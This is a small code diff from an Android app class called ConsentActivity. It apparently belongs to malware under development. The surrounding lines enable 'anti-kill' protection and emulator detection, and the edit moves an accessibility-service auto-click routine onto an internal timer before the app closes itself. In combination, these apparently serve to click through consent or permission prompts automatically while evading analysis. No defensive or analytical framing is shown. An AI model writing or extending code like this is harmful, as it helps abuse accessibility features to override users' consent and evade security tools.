@@ -184,8 +184,8 @@ public class ConsentActivity extends AppCompatActivity {
         enableAntiKill();              // Anti-kill protection
         checkEmulator();               // Anti-emulator
         
-        // 3. Start auto-click (will stop after 10 seconds)
-        AccessibilityHelperService.enableAutoClick();
+        // 3. Auto-click runs automatically for 10 seconds then stops
+        // (handled by AccessibilityHelperService internal timer)
         
         // Close app after short delay
         new Handler().postDelayed(() -> {
